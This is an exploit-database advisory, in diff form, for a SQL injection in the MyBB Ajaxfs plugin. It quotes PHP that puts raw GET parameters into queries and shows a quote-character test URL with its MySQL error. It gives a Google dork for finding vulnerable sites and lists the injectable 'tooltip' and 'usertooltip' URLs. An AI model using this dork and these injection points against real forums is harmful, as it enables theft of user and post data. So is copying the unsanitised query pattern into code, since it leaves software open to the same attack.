@@ -1,0 +1,76 @@
+###########################
+
+# Mybb Ajaxfs Plugin Sql Injection vulnerability
+
+###########################
+
+#################################
+#
+#     @@@    @@@@@@@@@@@    @@@@@           @@@@@@@@@@            @@@  @@@@@@@
+#     @@@    @@@@@@@@@@@    @@@  @@         @@@     @@            @@@  @@@@@@@@ 
+#     @@@    @@@            @@@    @@       @@@       @@          @@@  @@@  @@@ 
+#     @@@    @@@            @@@      @@     @@@     @@            @@@  @@@  @@@ 
+#     @@@    @@@@@@@@@@@    @@@       @     @@@@@@@@@@            @@@  @@@@@@
+#     @@@    @@@@@@@@@@@    @@@     @@      @@@     @@            @@@  @@@@@@
+#     @@@    @@@            @@@   @@        @@@       @@   @@@    @@@  @@@ @@@
+#     @@@    @@@            @@@ @@          @@@     @@     @@@    @@@  @@@  @@@
+#     @@@    @@@@@@@@@@@    @@@@@           @@@@@@@@@@     @@@    @@@  @@@   @@@
+#
+#####################################
+ 
+# Exploit Title : Mybb Ajaxfs Plugin Sql Injection vulnerability
+ 
+# Author : Iranian Exploit DataBase
+ 
+# Discovered By : IeDb
+ 
+# Email : [email protected]  -  [email protected]
+ 
+# Home : http://iedb.ir   -   http://iedb.ir/acc
+ 
+# Fb Page : https://www.facebook.com/pages/Exploit-And-Security-Team-iedbir/199266860256538
+ 
+# Software Link : http://mods.mybb.com/download/ajax-forum-stat-v-2
+ 
+# Security Risk : High
+ 
+# Tested on : Linux
+ 
+# Dork : inurl:ajaxfs.php
+ 
+#################################
+ 
+1)
+ 
+  if(isset($_GET['tooltip']))
+    {
+    $pid=$_GET['tooltip'];
+    $query_post = $db->query ("SELECT * FROM ".TABLE_PREFIX."posts WHERE pid='$pid'");
+ 
+ 
+2)
+ 
+ if(isset($_GET['usertooltip']))
+    {
+    $uid=$_GET['usertooltip'];
+    $query_user = $db->query ("SELECT * FROM ".TABLE_PREFIX."users WHERE uid='$uid'");
+ 
+http://localhost/Upload/ajaxfs.php?usertooltip=1'
+ 
+    1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
+ 
+Google DORK : inurl:ajaxfs.php
+ 
+ 
+# Exploit :
+ 
+# http://site.com/mybb/ajaxfs.php?tooltip=[sql]
+ 
+# http://site.com/mybb/ajaxfs.php?usertooltip=[sql]
+ 
+ 
+#################################
+ 
+# Tnx To : All Member In Iedb.ir/acc & Iranian Hackers
+ 
+#################################
